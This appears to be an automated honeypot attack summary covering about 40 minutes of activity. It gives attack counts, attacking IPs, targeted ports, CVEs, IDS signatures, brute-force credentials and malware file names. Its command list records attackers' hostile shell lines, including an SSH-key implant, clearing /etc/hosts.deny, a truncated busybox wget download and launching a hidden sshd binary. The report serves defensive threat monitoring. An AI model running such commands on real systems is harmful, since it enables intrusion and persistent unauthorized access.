Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-27T20:01:30Z
**Timeframe:** 2025-10-27T19:20:01Z to 2025-10-27T20:00:01Z
**Files Used:**
- agg_log_20251027T192001Z.json
- agg_log_20251027T194001Z.json
- agg_log_20251027T200001Z.json

**Executive Summary:**
This report summarizes honeypot activity over a period of approximately 40 minutes, analyzing data from three separate log files. A total of 22,940 attacks were recorded across various honeypots. The most targeted services were SSH (Cowrie) and various services monitored by Honeytrap. A significant portion of the attacks originated from IP address 77.83.240.70. Attackers were observed attempting to gain access, perform reconnaissance, and deploy malicious scripts. Several CVEs were targeted, and a variety of intrusion signatures were triggered.

**Detailed Analysis:**

*   **Attacks by Honeypot:**
    *   Cowrie: 7621
    *   Honeytrap: 7115
    *   Suricata: 3299
    *   Dionaea: 1525
    *   Ciscoasa: 1646
    *   Sentrypeer: 1239
    *   Mailoney: 81
    *   Tanner: 35
    *   Redishoneypot: 27
    *   Adbhoney: 25
    *   Dicompot: 30
    *   ConPot: 16
    *   H0neytr4p: 13
    *   Honeyaml: 15
    *   Miniprint: 27
    *   Ipphoney: 4
    *   ElasticPot: 2

*   **Top Attacking IPs:**
    *   77.83.240.70
    *   203.81.241.55
    *   144.172.108.231
    *   41.38.5.6
    *   36.142.148.154
    *   195.201.41.250
    *   34.122.106.61
    *   202.10.40.249
    *   103.176.78.241
    *   166.140.91.205
    *   186.80.18.158
    *   154.12.94.3
    *   172.173.103.90
    *   163.172.99.31
    *   103.193.15.48

*   **Top Targeted Ports/Protocols:**
    *   5060
    *   445
    *   TCP/445
    *   22
    *   5901
    *   5903
    *   25
    *   23
    *   TCP/22
    *   8333
    *   5904
    *   5905

*   **Most Common CVEs:**
    *   CVE-2006-2369
    *   CVE-2021-35394
    *   CVE-2002-0013
    *   CVE-2002-0012
    *   CVE-1999-0517
    *   CVE-2017-7577
    *   CVE-2006-3602
    *   CVE-2006-4458
    *   CVE-2006-4542

*   **Commands Attempted by Attackers:**
    *   `cd ~; chattr -ia .ssh; lockr -ia .ssh`
    *   `lockr -ia .ssh`
    *   `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."`
    *   `cat /proc/cpuinfo | grep name | wc -l`
    *   `uname -a`
    *   `whoami`
    *   `lscpu | grep Model`
    *   `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'`
    *   `crontab -l`
    *   `w`
    *   `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;`
    *   `cd /data/local/tmp/; rm *; busybox wget ...`
    *   `chmod +x ./.7960757998550482203/sshd;nohup ./.7960757998550482203/sshd ...`

*   **Signatures Triggered:**
    *   ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication
    *   2024766
    *   ET DROP Dshield Block Listed Source group 1
    *   2402000
    *   ET SCAN MS Terminal Server Traffic on Non-standard Port
    *   2023753
    *   ET SCAN NMAP -sS window 1024
    *   2009582
    *   ET HUNTING RDP Authentication Bypass Attempt
    *   2034857
    *   ET DROP Spamhaus DROP Listed Traffic Inbound group 42
    *   2400041

*   **Users / Login Attempts:**
    *   345gs5662d34/345gs5662d34
    *   root/3245gs5662d34
    *   root/j4px7zeeoy
    *   guest/abcd1234
    *   root/qq123456.
    *   liangzk/liangzk
    *   root/qwer123@
    *   root/jalgr10adm.
    *   idongsb/idongsb

*   **Files Uploaded/Downloaded:**
    *   lol.sh;
    *   json
    *   arm.uhavenobotsxd;
    *   arm.uhavenobotsxd
    *   arm5.uhavenobotsxd;
    *   arm5.uhavenobotsxd
    *   arm6.uhavenobotsxd;
    *   arm6.uhavenobotsxd
    *   arm7.uhavenobotsxd;
    *   arm7.uhavenobotsxd
    *   x86_32.uhavenobotsxd;
    *   x86_32.uhavenobotsxd
    *   mips.uhavenobotsxd;
    *   mips.uhavenobotsxd
    *   mipsel.uhavenobotsxd;
    *   mipsel.uhavenobotsxd

*   **HTTP User-Agents:**
    *   (No data)

*   **SSH Clients:**
    *   (No data)

*   **SSH Servers:**
    *   (No data)

*   **Top Attacker AS Organizations:**
    *   (No data)

**Key Observations and Anomalies:**
- The high number of attacks from a single IP (77.83.240.70) suggests a targeted or persistent attacker.
- The commands executed by attackers indicate a focus on reconnaissance of the system's hardware and user accounts, as well as attempts to install SSH keys for persistent access.
- A notable command involved downloading and executing multiple files with the `.uhavenobotsxd` extension, which is likely a form of malware.
- The "DoublePulsar Backdoor" signature was triggered a large number of times, indicating attempts to exploit a known vulnerability.
- A wide range of usernames and passwords were used in brute-force attempts, with a mix of common and more complex credentials.
- The variety of targeted ports and protocols indicates that attackers are scanning for a broad range of vulnerable services.
